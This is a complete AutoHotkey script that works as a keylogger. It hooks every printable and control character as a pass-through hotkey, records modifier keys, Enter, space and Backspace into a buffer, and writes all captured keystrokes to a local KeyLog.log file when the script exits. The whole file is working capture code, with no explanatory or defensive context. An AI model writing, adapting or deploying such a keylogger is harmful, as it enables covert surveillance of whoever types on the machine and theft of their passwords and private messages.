;Settings
#NoEnv  						;Recommended for performance.
#SingleInstance Force			;Make Single instance application.
#Persistent						;Keep running until the user asks to exit.
SetWorkingDir %A_ScriptDir%		;Ensures a consistent starting directory.

SetBatchLines, -1

OnExit, SaveAndExit

;VarSetCapacity(keyBuff, 2560000)	;2.5 MB

;############################################################################

SetFormat, Integer, H	;Numbers in Hex

;Attach All Hotkeys
Loop, 0x7f
	Hotkey, % "*~" . chr(A_Index), LogKey
Return

;The Main Label
LogKey:
	Key := RegExReplace(asc(SubStr(A_ThisHotkey,0)),"^0x")
	Key = % Chr("0x" Key)
	StringLower, Key, Key
	keyBuff .= Key
Return

;Other Important Keys
~+::
	keyBuff .= "[Shift]"
Return

~!::
	keyBuff .= "[Alt]"
Return

~^::
	keyBuff .= "[Ctrl]"
Return

~enter::
	keyBuff .= "`r`n"
Return

~space::
	keyBuff .= " "
Return

~del::
	keyBuff := ""
Return

~backspace::
	StringTrimRight, keyBuff, keyBuff, 1
Return

SaveAndExit:
	FileAppend, %keyBuff%, KeyLog.log
	keyBuff :=
ExitApp
